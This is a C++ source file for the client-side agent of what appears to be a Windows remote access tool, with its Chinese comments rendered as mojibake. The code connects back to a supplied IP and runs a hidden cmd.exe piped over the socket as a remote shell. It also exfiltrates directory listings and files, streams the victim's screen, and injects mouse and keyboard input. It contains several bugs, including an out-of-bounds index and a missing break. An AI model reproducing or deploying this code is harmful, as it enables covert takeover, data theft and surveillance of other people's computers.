#include "Server.h"
#include<windows.h>
#include <cstring>        // for strcat()
#include <io.h>
using namespace std;

Server::Server()
{
}

Server::~Server()
{
	if (hRead != NULL)
	{
		CloseHandle(hRead);
	}
	if (hWrite != NULL)
	{
		CloseHandle(hWrite);
	}
	if (hCmdWrite != NULL)
	{
		CloseHandle(hCmdWrite);
	}
	if (hCmdRead != NULL)
	{
		CloseHandle(hCmdRead);
	}
}

BOOL Server::CreateServer(const char* szIp, u_short nPort)
{
	//1.����tcp�ͻ���
	BOOL bRet = m_tcpSocket.CreateSocket();
	if (!bRet)
	{
		cout << "tcp�ͻ��˴���ʧ��" << endl;
		return FALSE;
	}

	if (!m_tcpSocket.Connect((char*)szIp, nPort))
	{
		m_tcpSocket.CloseSocket();
		return 0;
	}
	cout << "IP Address:  "<<szIp<<"  Port: "<<nPort<<" �û��Ѿ����ӡ�������" << endl;

	//����߳�����������Ļ���ݣ�
	HANDLE hHandleSreen = CreateThread(NULL, 0, SreenProc, this, 0, NULL);
	return TRUE;
}



DWORD __stdcall Server::SreenProc(LPVOID lpParam)
{
	Server* pThis = (Server*)lpParam;

	while (TRUE)
	{
		if (pThis->isScreen ==TRUE)
		{
			pThis->SendPreScreen();
		}
	}

	return 0;
}

BOOL Server::RunServer()
{
	while (TRUE)
	{
		//���ܰ�ͷ������
		PKGHDR hdr;

		int nRet = m_tcpSocket.Recv( (char*)&hdr,sizeof(hdr));

		//���հ���
		LPBYTE pBuff = NULL;
		if (hdr.m_nLen > 0)
		{
			int nRecved = 0;
			pBuff = new BYTE[hdr.m_nLen];
			while (nRecved < hdr.m_nLen)
			{
				nRet = m_tcpSocket.Recv(
					(char*)(pBuff + nRecved), hdr.m_nLen - nRecved);
				nRecved += nRet;
			}
		}

			//��������
			switch (hdr.m_cmd)
			{
			case DT_CMD:
			{
				//����CMD
				OnCMD();
			}
			break;
			case DT_SENDCMD:
			{
				//ִ��CMD����
				OnSendCMD(pBuff, hdr.m_nLen);
			}
			break;
			case DT_GETDIRVERS:
			{
				//����̷�
				OnGetDrivers();
			}
			break;
			case DT_GETFILEPATH:
			{
				//����ļ���Ϣ
				OnGetFilePATH(pBuff,hdr.m_nLen);
			}
			break;
			case DT_FILE_TAR_PATH:
			{
				//�ϴ��ļ�->��ȡ�ϴ��ļ�·��
				OnCreatrFile(pBuff, hdr.m_nLen);
			}
			break;
			case DT_FILE_UPLOAD:
			{
				//�ϴ��ļ�->��ʼ�ϴ�
				OnWriteFile(pBuff, hdr.m_nLen);
			}
			break;
			case  DT_FILE_UPLOAD_OVER:
			{
				//�ϴ� ->�ļ��Ѿ��������
				OnWriteFileOver();
			}
			break;
			case DT_FILE_DOWNLOAD:
			{
				//����->д������ �ļ�����
				OnCreateUpDownFile(pBuff, hdr.m_nLen);
			}
			break;
			case DT_SCREENSTART:
			{
				//����Զ����Ļ�߳�
				isScreen = TRUE;
			}
			break;
			case DT_SCREENSTOP:
			{
				//ֹͣ��Ļ�����߳�
				isScreen = FALSE;
			}
			case DT_MOUSEMOVE:
			{ 
				//��Ӧ����¼�
				PONMOUSE pt = (PONMOUSE)pBuff;
				if (pt != nullptr)
				{
					MouseEvent(pt);
				}
			}
			break;
			case  DT_KEYBOADEVENT:
			{
				//��Ӧ�����¼�
				UINT* pChar = (UINT*)pBuff;
				if (pChar != nullptr)
				{
					KeyBoardEvent(pChar);
				}
			}
			break;
			default:
				break;
			}
		}
    return 0;
}

//�����������
void Server ::MouseEvent(PONMOUSE MousePt)
{
	switch (MousePt->_MouseCmd)
	{
		//��������ƶ�
	case MOUSEMOVE:
	{
		MouseMove(MousePt);
		printf("��ǰ�������x��%d--y��%d\r\n", MousePt->_x, MousePt->_Y);
	}
	break;
	case LMOUSEDOWN:
	{
		MouseLbuttonDown(MousePt);
		printf("��������������x��%d--y��%d\r\n", MousePt->_x, MousePt->_Y);
	}
	break;
	case LMOUSEUP:
	{
		MouseLbuttonUp(MousePt);
		printf("��������������x��%d--y��%d\r\n", MousePt->_x, MousePt->_Y);
	}
	break;
	case RMOUSEDOWN:
	{
		MouseRbuttonDown(MousePt);
		printf("����Ҽ���������x��%d--y��%d\r\n", MousePt->_x, MousePt->_Y);
	}
	break;
	case RMOUSEUP:
	{
		MouseRbuttonUp(MousePt);
		printf("����Ҽ���������x��%d--y��%d\r\n", MousePt->_x, MousePt->_Y);
	}
	break;
	}

	//������յ������Դ
	if (MousePt != NULL)
	{
		delete[](LPBYTE)MousePt;
	}
}

void Server::KeyBoardEvent(UINT* pChar)
{
	keybd_event(*pChar, 0, KEYEVENTF_EXTENDEDKEY, 0);
	keybd_event(*pChar, 0, KEYEVENTF_KEYUP, 0);
	Sleep(20);
	printf("������%c\r\n", *pChar);
	if (pChar != NULL)
	{
		delete[](LPBYTE)pChar;
	}
}


//��CMD����̨
void Server::OnCMD()
{
	//ͬ����
	g_lock.Lock();
	//�ӽ�����Ҫ�õ������̾������Ҫ��ȫ����
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES),NULL,TRUE };
	//�����ܵ� 1
	BOOL bRet = CreatePipe(&hRead, &hCmdWrite, &sa, 0);
	if (!bRet)
	{
		printf("Create Filed");
		return;
	}
	//�����ܵ� 2
	bRet = CreatePipe(&hCmdRead, &hWrite, &sa, 0);
	if (!bRet)
	{
		printf("Create Filed");
		return;
	}

	//�����ӽ��� �����������ӽ��̷����ݣ��ӽ�����Ҫ�õ������̾����
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	//Sleep(100);
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdInput = hCmdRead;
	si.hStdOutput = hCmdWrite;
	si.hStdError = hCmdWrite;

	ZeroMemory(&pi, sizeof(pi));

	//����CMD
	TCHAR cmd[MAX_PATH] = "cmd.exe";
	bRet = CreateProcess(
		NULL,
		(LPSTR)"cmd",
		NULL,
		NULL,
		TRUE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&si,
		&pi);

	if (!bRet)
	{
		printf("CreateProcess failed.");
		return;
	}

	DWORD dwBytesAvail = 0;
	char  strBuff[4096] = { 0 };
	DWORD dwBytesReaded = 0;
	Sleep(100);
	ReadFile(hRead, strBuff, 0x1000, &dwBytesReaded, NULL);
	Sleep(100);

	PKGHDR pkgSendCmd;
	pkgSendCmd.m_cmd = DT_CMD; 
	pkgSendCmd.m_nLen = dwBytesReaded+1;
	m_tcpSocket.Send((char*)&pkgSendCmd, sizeof(pkgSendCmd));
	m_tcpSocket.Send(strBuff, dwBytesReaded + 1);

	memset(strBuff, 0, sizeof(strBuff));  //��ջ�����
	Sleep(100);
	
	printf("��cmd����̨");
	g_lock.UnLock();
	
}

//ִ��CMD
void Server::OnSendCMD(LPBYTE pCmd, DWORD dwSize)
{
	g_lock.Lock();

	DWORD dwBytesWrited = 0;

	WriteFile(                    //д���ļ�
		hWrite,
		pCmd,
		dwSize,
		&dwBytesWrited,
		NULL);
	Sleep(100);
	DWORD dwBytesAvail = 0;
	char  strBuff[0x10000] = { 0 };
	DWORD dwBytesReaded = 0;
	while (PeekNamedPipe(hRead, NULL, 0, NULL, &dwBytesAvail, NULL)
		&& dwBytesAvail > 0) //ѭ���ж�1s�ڹܵ����Ƿ������ݣ��еĻ�����ѭ����û�����˳�
	{
	ReadFile(   //���ܵ�����
		hRead, 
		strBuff, 
		0x10000,
		&dwBytesReaded,
		NULL);
	Sleep(1000);
	printf(strBuff);

	PKGHDR pkgSendCmd;  
	pkgSendCmd.m_cmd = DT_CMD; dwBytesReaded + 1;
	pkgSendCmd.m_nLen = dwBytesReaded + 1;
	m_tcpSocket.Send((char*)&pkgSendCmd, sizeof(pkgSendCmd));
	m_tcpSocket.Send(strBuff, dwBytesReaded + 1);

	memset(strBuff, 0, sizeof(strBuff));  //��ջ�����
	}

	g_lock.UnLock();
	
}

void Server::OnGetFilePATH(LPBYTE szbuff, DWORD dwSize)
{

	char dirNew[260];
	strcpy(dirNew, (char*)szbuff);
	if (dirNew[-1] != ' \\ ')
	{
		strcat(dirNew, "\\");		// ��Ŀ¼�������"\\*.*"���е�һ������
	}
	strcat(dirNew, "*.*");    // ��������

	intptr_t handle;
	_finddata_t findData;

	handle = _findfirst(dirNew, &findData);
	if (handle == -1)        // ����Ƿ�ɹ���ʧ�ܷ���
		return;

	do
	{
		if (findData.attrib & _A_SUBDIR)
		{
			if (strcmp(findData.name, ".") == 0 || strcmp(findData.name, "..") == 0)
				continue;
			cout <<"����: "<< dirNew << "    ���ͣ�< �ļ���>"
				<< "��С��" << findData.size << "ʱ��" << findData.time_write << endl;

			// ��Ŀ¼�������"\\"����������Ŀ¼��������һ������
			strcpy(dirNew, (char*)szbuff);
			strcat(dirNew, "\\");
			strcat(dirNew, findData.name);


			FILEINFOo pkgFileInfo;
			memcpy(pkgFileInfo.FileName, dirNew, sizeof(dirNew));
			pkgFileInfo.FileType = 1;
			//pkgFileInfo.FileSize = findData.size;

			
			PKGHDR pkgFile;
			pkgFile.m_cmd = DT_FILEPATH;
			pkgFile.m_nLen = sizeof(pkgFileInfo);
			int nLnepkgFileInfi = sizeof(pkgFile);
			m_tcpSocket.Send((char*)&pkgFile, sizeof(pkgFile));
			m_tcpSocket.Send((char*)&pkgFileInfo, sizeof(pkgFileInfo));

		}
		else if(findData.size)
		{
			cout << "���ƣ�" << dirNew << "    ���ͣ�< �ļ�>"
				<< "��С��" << findData.size << "ʱ��" << findData.time_write << endl;

			// ��Ŀ¼�������"\\"����������Ŀ¼��������һ������
			strcpy(dirNew, (char*)szbuff);
			strcat(dirNew, "\\");
			strcat(dirNew, findData.name);


			FILEINFOo pkgFileInfo;
			memcpy(pkgFileInfo.FileName, dirNew, sizeof(dirNew));
			pkgFileInfo.FileType = 0;
			//pkgFileInfo.FileSize = findData.size;


			PKGHDR pkgFile;
			pkgFile.m_cmd = DT_FILEPATH;
			pkgFile.m_nLen = sizeof(pkgFileInfo);
			int nLnepkgFileInfi = sizeof(pkgFile);
			m_tcpSocket.Send((char*)&pkgFile, sizeof(pkgFile));
			m_tcpSocket.Send((char*)&pkgFileInfo, sizeof(pkgFileInfo));

		}
		
	} while (_findnext(handle, &findData) == 0);

	_findclose(handle);    // �ر��������
	/*
	string path = szbuff;
	string FullPathName=path.append("\\*.*");

	HANDLE hFile;

	WIN32_FIND_DATA WFD;
	HANDLE hError;

	hError = ::FindFirstFile(path.c_str(), &WFD);
	if (hError == INVALID_HANDLE_VALUE)
	{
		printf("����ʧ��!");
	}
	while (::FindNextFile(hError, &WFD))
	{
		// ����.��..
		if (strcmp(WFD.cFileName, ".") == 0
			|| strcmp(WFD.cFileName, "..") == 0)
		{
			continue;
		}
		// ��������·��
		FindData.cFileName;
		printf(path.c_str(), "%s\\%s", Path, FindData.cFileName);
		FileCount++;
		// ����������ļ�
		printf("\n%d  %s  ", FileCount, FullPathName);

		/*
		fileIndex.FileName = str.GetBuffer(0);
		jsonTmp.Add("Name", str.GetBuffer(0));
		str = finder.GetFilePath();
		jsonTmp.Add("NamePath", str.GetBuffer(0));
		BOOL bIs = finder.IsArchived();
		str = bIs ? "1" : "0";
		jsonTmp.Add("IsFile", str.GetBuffer(0));

		json.Add(jsonTmp);

	}

	DATAPACKAGE pkgFilePath;
	pkgFilePath.m_hdr.m_nDataType = DT_FILEPATH;
	pkgFilePath.m_hdr.m_nDataLen = strFilePath.GetLength() + 1;
	pkgFilePath.m_pBuff = strFilePath.GetBuffer(0);
	pThis->m_tcpClient.SendPackage(&pkgFilePath);
			
	*/
}




void Server::OnGetDrivers()
{
	//��ȡ�̷�
	char aryBuff[MAXWORD] = { 0 };
	DWORD dwBytes = GetLogicalDriveStrings(sizeof(aryBuff), aryBuff);

	char* lpDriverBuffer = aryBuff;
	while (*lpDriverBuffer != NULL) {
		/*
		DATAPACKAGE pkgDrivers;
		pkgDrivers.m_hdr.m_nDataType = DT_DRIVERS;
		pkgDrivers.m_hdr.m_nDataLen = 0x100;
		pkgDrivers.m_pBuff = lpDriverBuffer;
		m_tcpSocket.SendPackage(&pkgDrivers);
		*/
		PKGHDR pkgGetDrivers;
		pkgGetDrivers.m_cmd = DT_DRIVERS;
		pkgGetDrivers.m_nLen =8 ;
		m_tcpSocket.Send((char*)&pkgGetDrivers, sizeof(pkgGetDrivers));
		m_tcpSocket.Send(lpDriverBuffer, 8);

		string strDriver = lpDriverBuffer;
		lpDriverBuffer = lpDriverBuffer + strDriver.size() + 1;

	}

}

void Server::OnCreatrFile(LPBYTE szbuff, DWORD dwSize)
{
	//����Ŀ���ļ�
	hFileDst = ::CreateFile(
		(char*)szbuff,
		GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS, //Ŀ���ļ����Ǵ������ļ�,����ļ��Ѿ�����,�����ԭ�ļ�����
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hFileDst != INVALID_HANDLE_VALUE)
	{
		printf("����Ŀ���ļ�����ɹ�\r\n");
		//delete[] hFileDst;
	}
}

void Server::OnWriteFile(LPBYTE szbuff, DWORD dwSize)
{
	//д�����ļ�
	DWORD dwBytesToWrite = 0;
	BOOL bRet = ::WriteFile(
		hFileDst,
		szbuff,
		dwSize, //��ȡ�˶����ֽ�,��д������ֽ�
		&dwBytesToWrite,
		NULL);
	if (bRet)
	{
		printf(" �����ϴ��ļ����Ѿ��ϴ���:%d k\r\n", dwBytesToWrite);
	}
	delete[] szbuff;

}

void Server::OnWriteFileOver()
{
	//�ļ��ϴ���ϡ��ر�Ŀ���ļ����
	CloseHandle(hFileDst);
	printf("�ļ��ϴ����");
}

void Server::OnCreateUpDownFile(LPBYTE szbuff, DWORD dwSize)
{
	//��Դ�ļ�
	hFileSrc = ::CreateFile(
		(char*)szbuff,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	//ÿ���ϴ�64K
	const DWORD dwPerSize = 0x10000;
	char aryBuff[dwPerSize] = { 0 };

	//��ȡ�ļ����ܴ�С
	__int64 nTotalFileSize = 0;
	GetFileSizeEx(hFileSrc, (PLARGE_INTEGER)&nTotalFileSize);

	/*
	//�����ļ��ܴ�С��������ʾ����
	PKGHDR pkgFileSize;
	pkgFileSize.m_cmd = DT_FILE_SIZE;
	pkgFileSize.m_nLen = nTotalFileSize;
	//m_tcpSocket.Send((char*)&pkgFileSize, sizeof(pkgFileSize));
	//m_tcpSocket.Send((char*)"0", nTotalFileSize);
	*/

	//�Ѿ���������ݵĴ�С
	__int64 nHanleFileSize = 0;

	while (true)
	{
		//��Դ�ļ���ȡ64K
		DWORD dwBytesToRead = 0;
		BOOL bRet = ::ReadFile(
			hFileSrc,
			aryBuff,
			sizeof(aryBuff),
			&dwBytesToRead, //ʵ�ʶ�ȡ���ֽ���
			NULL);

		// ���ʹ�Ŷ�ȡ���ֽڵĻ����������ض˵����ļ�
		PKGHDR pkgDownload;
		pkgDownload.m_cmd = DT_FILE_DOWNLOAD;
		pkgDownload.m_nLen = dwBytesToRead;
		m_tcpSocket.Send((char*)&pkgDownload, sizeof(pkgDownload));
		m_tcpSocket.Send(aryBuff, dwBytesToRead);
		printf("�ļ��������ڶ�ȡ--%d\r\n", dwBytesToRead);

		//�ж��ļ��Ƿ��ȡ���
		nHanleFileSize += dwBytesToRead;

		if (nHanleFileSize >= nTotalFileSize)
		{
			// �رվ��
			OnWriteFileOverupDown();

			//�������ض��ļ��ϴ���ϡ��رվ��
			PKGHDR pkgDownloadOver;
			pkgDownloadOver.m_cmd = DT_FILE_DOWNLOAD_OVER;
		    pkgDownloadOver.m_nLen = 0;
			m_tcpSocket.Send((char*)&pkgDownloadOver,sizeof(pkgDownloadOver));
			break;
		}
	}
}

void Server::OnWriteFileOverupDown()
{
	//�ļ��ϴ���ϡ��رմ��ļ����
	CloseHandle(hFileSrc);
	printf("�ļ��������");
}

void Server :: SendPreScreen()
{

	// ��ȡ���ڵ�ǰ��ʾ�ļ�����
	HWND hWnd = GetDesktopWindow();//������Ҫ�����滻���Լ�����ľ�� 
	HMONITOR hMonitor = MonitorFromWindow(hWnd, MONITOR_DEFAULTTONEAREST);

	// ��ȡ�������߼������߶�
	MONITORINFOEX miex;
	miex.cbSize = sizeof(miex);
	GetMonitorInfo(hMonitor, &miex);
	int cxLogical = (miex.rcMonitor.right - miex.rcMonitor.left);
	int cyLogical = (miex.rcMonitor.bottom - miex.rcMonitor.top);

	// ��ȡ��������������߶�
	DEVMODE dm;
	dm.dmSize = sizeof(dm);
	dm.dmDriverExtra = 0;
	EnumDisplaySettings(miex.szDevice, ENUM_CURRENT_SETTINGS, &dm);
	int cxPhysical = dm.dmPelsWidth;
	int cyPhysical = dm.dmPelsHeight;


	//����Ļ�������ݵ��ڴ�λͼ
	int nScreenWith = GetSystemMetrics(SM_CXSCREEN);
	int nScreenHeigh = GetSystemMetrics(SM_CYSCREEN);


	nScreenWith = cxPhysical;
	nScreenHeigh = cyPhysical;

	HDC hDcScreen = GetDC(NULL);
	HDC hDcMem = CreateCompatibleDC(hDcScreen);
	HBITMAP hBmpMem = CreateCompatibleBitmap(hDcScreen, nScreenWith, nScreenHeigh);
	SelectObject(hDcMem, hBmpMem);
	BitBlt(hDcMem, 0, 0, nScreenWith, nScreenHeigh,
		hDcScreen, 0, 0, SRCCOPY);

	//��ȡ��Ļ����
	DWORD dwBufLen = nScreenHeigh * nScreenWith * sizeof(COLORREF);
	LPBYTE pBuffBmp = new BYTE[dwBufLen];
	GetBitmapBits(hBmpMem, dwBufLen, pBuffBmp);

	//������Ļ����
	PKGHDR hdr;
	hdr.m_cmd = DT_SCREENSTART;
	hdr.m_nLen = dwBufLen + sizeof(SCREEN);

	PSCREEN pSreenData = (PSCREEN)new BYTE[hdr.m_nLen];
	pSreenData->m_dwScreenHeigh = nScreenHeigh;
	pSreenData->m_dwScreenWith = nScreenWith;
	pSreenData->m_dwDataLen = dwBufLen;
	memcpy(pSreenData->m_data, pBuffBmp, pSreenData->m_dwDataLen);

	m_tcpSocket.Send( (char*)&hdr, sizeof(hdr));
	m_tcpSocket.Send((char*)pSreenData, hdr.m_nLen);


	delete[] pBuffBmp;
	delete[](LPBYTE)pSreenData;
}

void Server::MouseMove(PONMOUSE MousePt )
{
    HWND hwnd = GetDesktopWindow();
    POINT SreenPt;
    SreenPt.x = MousePt->_x;
    SreenPt.y = MousePt->_Y;

    //HWND hwnd = GetCapture();
    ::ClientToScreen(hwnd, &SreenPt);

    
    ::mouse_event(MOUSEEVENTF_MOVE, MousePt->_x, MousePt->_Y, 0, 0);
    SetCursorPos(MousePt->_x, MousePt->_Y);
}


void Server::MouseLbuttonDown(PONMOUSE MousePt)
{
	HWND hwnd = GetDesktopWindow();
	POINT SreenPt;
	SreenPt.x = MousePt->_x;
	SreenPt.y = MousePt->_Y;


	::ClientToScreen(hwnd, &SreenPt);

	SetCursorPos(MousePt->_x, MousePt->_Y);
	::mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
}

void Server::MouseLbuttonUp(PONMOUSE MousePt)
{
	HWND hwnd = GetDesktopWindow();
	POINT SreenPt;
	SreenPt.x = MousePt->_x;
	SreenPt.y = MousePt->_Y;


	::ClientToScreen(hwnd, &SreenPt);

	SetCursorPos(MousePt->_x, MousePt->_Y);
	::mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
}

void Server::MouseRbuttonDown(PONMOUSE MousePt)
{
	HWND hwnd = GetDesktopWindow();
	POINT SreenPt;
	SreenPt.x = MousePt->_x;
	SreenPt.y = MousePt->_Y;


	::ClientToScreen(hwnd, &SreenPt);

	SetCursorPos(MousePt->_x, MousePt->_Y);
	::mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
}

void Server::MouseRbuttonUp(PONMOUSE MousePt)
{
	HWND hwnd = GetDesktopWindow();
	POINT SreenPt;
	SreenPt.x = MousePt->_x;
	SreenPt.y = MousePt->_Y;


	::ClientToScreen(hwnd, &SreenPt);

	SetCursorPos(MousePt->_x, MousePt->_Y);
	::mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
}

